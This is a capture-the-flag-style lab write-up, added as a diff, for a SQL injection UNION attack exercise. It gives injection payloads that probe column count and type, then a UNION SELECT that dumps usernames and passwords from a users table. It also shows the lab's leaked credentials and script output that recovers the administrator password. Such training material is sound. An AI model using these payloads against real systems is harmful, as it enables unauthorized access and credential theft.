@@ -1,0 +1,43 @@
+LAB 05 - SQL injection UNION attack, retrieving data from other tables
+
+SQLi - Product category filter
+
+End goal: Retrieve all usernames and passwords, and use the information to log in as the administrator user.
+
+Quick method: ' UNION SELECT * FROM users--
+
+Results:
+wiener
+7fg0r1dy19t60zlu1bes
+administrator
+97dy08b8kfxz6egt2ezb
+carlos
+7k4otta0c47uy256xe4h
+
+Then login with adminstrator. But, we'll do it the way the lab wants us to do
+
+Analysis:
+
+1. Determine # of columns that the vulnerable query is using
+'ORDER BY 1--
+'ORDER BY 2--
+'ORDER BY 3-- --> internal server error
+
+--> 2 columns
+
+2. Determine the data type of the columns
+SELECT a,b FROM products WHERE category = Lifestyle
+' UNION SELECT 'a', NULL--
+' UNION SELECT 'a', 'a'--
+--> both columns are of data type string
+
+' UNION SELECT username, password FROM users--
+
+========================================================================================================
+Script output:
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-05]
+└─$ python3 sqli-lab-05.py "https://0a3b00f50334147e84ef1187002300b2.web-security-academy.net"
+[+] Dumping the list of usernames and passwords...
+[+] Found administrator password.
+[+] The administrator password is: 97dy08b8kfxz6egt2ezb
